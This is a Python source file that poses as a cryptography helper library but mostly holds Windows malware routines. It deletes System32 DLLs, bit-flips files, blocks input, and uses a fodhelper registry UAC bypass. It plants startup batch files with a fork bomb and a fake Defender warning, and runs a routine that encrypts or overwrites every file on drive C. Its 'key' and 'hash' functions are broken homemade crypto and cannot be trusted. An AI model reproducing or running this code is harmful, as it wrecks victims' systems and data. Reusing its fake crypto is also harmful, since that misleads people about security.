try:
  import random
  import os
  import sys
  import pyautogui
  import rsa
  import hashlib
  import string
  import ctypes
  import binascii
  import _winreg
  import platform
  import time, datetime
except ImportError:
  print("Required packages not found, quitting in 5...")
  time.sleep(5)
  exit()

# Globals
CC = lambda: os.system('cls' if os.name == 'nt' else 'clear')
startupDir = (
  r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
  % os.getlogin())


# Classes
class crytography_functions:

  def clearconsole():
    if platform == "linux" or platform == "linux2":
      os.system("clear")
    else:
      os.system("cls")
    return str("")

  def createDigest():
    keyValue = random.randint(90, 200)
    buffer = random.randint(6, 9)
    publicKey, privateKey = rsa.newkeys(keyValue)
    encMessage = rsa.encrypt(str(random.randint(1, 3)).encode(), publicKey)
    hexMessage = binascii.hexlify(encMessage)
    bar = str(hexMessage).replace("'", '')
    foo = str(bar).replace('b', '')

    if len(list(foo)) > 10:
      foolist = list(foo)
      returnvalue = ''.join(random.choice(foolist) for i in range(buffer))
    else:
      returnvalue = foo
    return returnvalue

  def checkfile(file, print=None):
    if os.path.isfile(file) == False:
      returnList = ("File not found", "Or is not a file")
    if os.path.isfile(file) == True:
      with open(file, "r") as File:
        lines = File.readlines()
        size = ("Size:", os.path.getsize(file))
        lastedited = ("Last-Opened:", os.path.getmtime(file))
        linenum = ("Line-Number:", len(lines))
        creationTime = ("Created:", os.path.getctime(file))
        returnList = (size, lastedited, linenum, creationTime)
      if print != None:
        print(returnList)
      else:
        return returnList

  def mutilate(file):
    with open(file, "r+") as Fout:
      for line in Fout:
        lineList = list(line)
        randoms = list(string.printable)

      for i in lineList:
        newList = lineList + randoms
        random.shuffle(newList)

      newLine = ''.join(random.choice(newList) for i in range(len(lineList)))
      Fout.truncate(0)
      Fout.write(newLine)

  def getinfo():
    OS = ("Operating-System: ", sys.platform)
    currentTime = ("Time: ", datetime.now().time())
    currentDate = ("Date: ", datetime.now().date())
    currentProccess = ("Current-Process: ", os.getpid())
    encoding = ("Encoding: ", sys.getfilesystemencoding())
    returnList = (OS, currentDate, currentTime, currentProccess, encoding)
    return returnList

  def wipefile(file):
    with open(file, "w") as Fout:
      Fout.truncate(0)
      Fout.close()
    return str("")


class hash():

  def hash(target, print=None):
    sha256 = hashlib.sha256()
    xO = random.randint(10, 200)
    targetConvert = list(target)
    for i in range(xO):
      random.shuffle(targetConvert)

    targetShuffled = ''.join(targetConvert)
    sha256.update(targetShuffled.encode())

    if print != None:
      print(sha256.hexdigest())
    else:
      return sha256.hexdigest()

  def hashfile(file):
    BUF_SIZE = os.path.getsize(file)

    sha256 = hashlib.sha256()

    with open(file, 'rb') as f:
      while True:
        data = f.read(BUF_SIZE)

        if not data:
          break

    sha256.update(data)

    return sha256.hexdigest()

  def comparehash(hashA, hashB):
    if hashA is hashB:
      return True
    else:
      return False


class key():

  def keypair():
    threshold = random.randint(6, 14)
    buff = random.randint(300, 10000)
    length = random.randint(50, 350)
    iterable = 0
    tiny = random.uniform(0.001, 0.999)
    alphabet = string.ascii_letters + string.digits
    publicBase = '.'.join(random.choice(alphabet) for i in range(buff))
    privateBase = '.'.join(random.choice(alphabet) for i in range(buff))

    time.sleep(tiny)

    publicList = publicBase.split('.')
    privateList = privateBase.split('.')

    while iterable != threshold:
      x = privateList + publicList
      y = publicList + privateList
      for iteam in x, y:
        random.shuffle(x)
        random.shuffle(y)
      iterable += 1

    time.sleep(tiny)

    publicKey = ''.join(random.choice(x) for iterable in range(length))
    privateKey = ''.join(random.choice(y) for iterable in range(length))

    return publicKey, privateKey

  def solokey():
    threshold = random.randint(7, 12)
    primBuff = random.randint(500, 1000)
    secBuff = random.randint(500, 1000)
    length = random.randint(50, 350)
    iterable = 0
    tiny = random.uniform(0.001, 0.999)
    alphabet = string.ascii_letters + string.digits
    primaryBase = '.'.join(random.choice(alphabet) for i in range(primBuff))
    secondaryBase = '.'.join(random.choice(alphabet) for i in range(secBuff))

    time.sleep(tiny)

    primaryList = secondaryBase.split('.')
    secondaryList = primaryBase.split('.')

    while iterable != threshold:
      foo = primaryList + secondaryList
      bar = secondaryList + primaryList
      foobar = bar + foo
      for iteam in range(length):
        random.shuffle(foo)
        random.shuffle(bar)
        random.shuffle(foobar)
      iterable += 1

    time.sleep(tiny)

    soloKey = ''.join(random.choice(foobar) for iterable in range(length))

    return soloKey

  def secure(key):
    keyLength = len(key)
    keyList = list(key)
    olprime = random.randint(3, 8)
    buff = random.randint(200, 1000)
    alphabet = string.ascii_letters + string.digits + string.digits
    randomkey = list(random.choice(alphabet) for i in range(buff))

    for z in range(olprime):
      random.shuffle(keyList)
      random.shuffle(keyList)
      bar = keyList + randomkey
      for i in bar:
        random.shuffle(bar)

    newkey = ''.join(random.choice(bar) for i in range(keyLength))

    newList = list(newkey)

    for y in range(olprime):
      random.shuffle(randomkey)
      random.shuffle(randomkey)

    for x in range(olprime):
      random.shuffle(newList)
      random.shuffle(newList)
      foo = randomkey + newList
      for i in foo:
        random.shuffle(foo)

    returnKey = ''.join(random.choice(foo) for i in range(keyLength))

    return returnKey

  def validatekey(key, print=None):
    lowerAlphabet = list(string.ascii_lowercase)
    higherAlphabet = list(string.ascii_uppercase)
    allNumbers = list(string.digits)
    keyList = list(key)
    returnItem = list()
    lowercount = 0
    uppercount = 0
    digitcount = 0

    for i in keyList:
      if i in lowerAlphabet:
        lowercount += 1
      if i in higherAlphabet:
        uppercount += 1
      if i in allNumbers:
        digitcount += 1

    if int(uppercount + lowercount + digitcount) >= 40:
      returnItem.append("Strong Key")
    elif int(uppercount + lowercount + digitcount) >= 30:
      returnItem.append("Medium Key")
    elif int(uppercount + lowercount + digitcount) >= 20:
      returnItem.append("Weak Key")
    else:
      returnItem.append("Unsafe Key!")

    if print != None:
      print(returnItem)
    else:
      return returnItem


class encryption():

  def standard(file, message):
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()
    fernet = Fernet(key)

    with open(file, 'rb') as Fin:
      original = Fin.read()
      Fin.close()

    encrypted = fernet.encrypt(original)

    with open(file, 'wb') as Fout:
      Fout.write(encrypted)
      Fout.close()

    return key

  def double(file, message):
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()
    fernet = Fernet(key)

    with open(file, 'rb') as Fin:
      original = Fin.read()
      Fin.close()

    encrypted = fernet.encrypt(original)
    doubled = fernet.encrypt(encrypted)

    with open(file, 'wb') as Fout:
      Fout.write(doubled)
      Fout.close()

    return key


class decryption():

  def standard(file, key):
    from cryptography.fernet import Fernet
    fernet = Fernet(key)

    with open(file, 'rb') as Fin:
      encrypted = Fin.read()
      Fin.close()

    decrypted = fernet.decrypt(encrypted)

    with open(file, 'wb') as Fout:
      Fout.write(decrypted)
      Fout.close()

  def double(file, key):
    from cryptography.fernet import Fernet
    fernet = Fernet(key)

    with open(file, 'rb') as Fin:
      encrypted = Fin.read()
      Fin.close()

    decrypted = fernet.decrypt(encrypted)
    doubled = fernet.decrypt(decrypted)

    with open(file, 'wb') as Fout:
      Fout.write(doubled)
      Fout.close()


class Ptime():

  def nowtime(time=None, date=None):
    if time is False or date is True:
      return date
    if time is True or date is False:
      return time
    else:
      return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n\n"

  def currentdate():
    return datetime.datetime.now().strftime("%Y-%m-%d") + "\n\n"

  def currenttime():
    return datetime.datetime.now().strftime("%H:%M:%S") + "\n\n"


class functions():

  def seppuku():
    currentFile = str(os.getcwd() + "/main.py")
    os.remove(currentFile)

  def minimize_current_window():
    try:
      pyautogui.hotkey('win', 'm')
      return True
    except pyautogui.FailSafeException:
      return False

  def delete_dll():
    try:
      os.chdir('C:/Windows/System32')
      files = [f for f in os.listdir() if f.endswith('.dll')]
      for f in files:
        os.remove(f)
    except OSError:
      raise OSError('System32 directory does not exist.')

  def corrupt_startup_files(source_folder):
    files_in_source_folder = os.listdir(source_folder)

    # Corrupt the files by swapping random bits in their content
    for file in files_in_source_folder:
      path_to_file = os.path.join(source_folder, file)
      with open(path_to_file, "rb") as binary_file:
        data = binary_file.read()
        # Iterate over the bits in the file content
        for bit_index in range(len(data)):
          # Randomly decide whether to switch the bit
          switch = random.choice([True, False])
          if switch:
            # Replace the bit at the current index with its inverse
            data = data[:bit_index] + bytes([data[bit_index] ^ 0xFF]) + data[bit_index + 1:]
      # Write the corrupted content back to the file
      with open(path_to_file, "wb") as binary_file:
        binary_file.write(data)

  def disable_mouse_keyboard_windows():
    # Disable mouse
    ctypes.windll.user32.BlockInput(True)
    # Disable keyboard
    ctypes.windll.user32.DisableProcessWindowsGhosting()

  def UAC_bypass():
    CMD = r"C:\Windows\System32\cmd.exe"
    FOD_HELPER = r'C:\Windows\System32\fodhelper.exe'
    PYTHON_CMD = "python"
    REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
    DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

    def is_running_as_admin():
      try:
        return ctypes.windll.shell32.IsUserAnAdmin()
      except:
        return True

    def create_reg_key(key, value):
      try:
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)
        _winreg.CloseKey(registry_key)
      except WindowsError:
        raise

    def bypass_uac(cmd):
      try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
      except WindowsError:
        raise

    def execute():
      if is_running_as_admin():
        pass
        try:
          current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
          cmd = '{} /k {} {}'.format(CMD, PYTHON_CMD, current_dir)
          bypass_uac(cmd)
          os.system(FOD_HELPER)
          CC()
        except WindowsError:
          functions.seppuku()
          sys.exit(0)
      else:
        pass

  # ALTERNATIVE BYPASS (TEST zFIRST)
  #def UACbypass():
  #try:
  # Get the current value of the UAC
  #val = ctypes.windll.shell32.IsUserAnAdmin()
  # Set the UAC to 0 (disabled)
  #ctypes.windll.shell32.SetUserAccountControl(0)
  # Return the result
  #return val
  #except:
  #sys.exit(1)

  def startup_surprise():
    with open(startupDir + '/windowsserver.bat', 'w') as fin:
      fin.write('''
@ECHO OFF
:infLoop
%0|%0
tskill Taskmgr
goto infLoop
      ''')
      fin.close
    with open(startupDir + '/windowsdefender.bat', 'w') as Fin:
      Fin.write('''
@ECHO OFF
Do
msgbox "Modification of system code or a critical data structure was detected."
Loop
      ''')
      Fin.close()

  def file_fucker():

    def scanrecurse(baseDir):
      files = []
      for r, d, f in os.walk(baseDir):
        for file in f:
          filepath = os.path.join(r, file)
        if os.path.exists(filepath):
          files.append(os.path.join(r, file))
      return files

    try:
      for item in scanrecurse("C:"):
        with open(item, 'w+') as File:
          File.write(encryption.standard(item, open(item, 'r').read()))
          print("Encrypted:", item)
    except PermissionError:
      print("Failed encryption:", item)
